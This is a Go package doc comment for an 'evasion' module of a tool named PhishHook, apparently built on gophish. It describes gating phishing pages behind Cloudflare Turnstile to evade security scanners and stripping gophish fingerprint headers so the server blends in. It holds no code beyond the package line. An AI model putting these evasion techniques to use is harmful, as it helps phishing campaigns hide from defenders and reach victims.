// Package evasion provides security evasion features for PhishHook.
//
// This package includes:
//   - Cloudflare Turnstile integration for bot protection
//   - Header stripping middleware to remove identifying fingerprints
//   - Session management for challenge verification
//
// Turnstile Integration:
//
// The Turnstile middleware presents a Cloudflare challenge page to visitors
// before allowing access to phishing pages. This helps evade automated
// security scanners and analysis tools while appearing legitimate.
//
// Evasion Middleware:
//
// The evasion middleware strips identifying headers like X-Server: gophish
// that can be used to fingerprint the server. It can also add custom
// headers to better blend with legitimate infrastructure.
package evasion
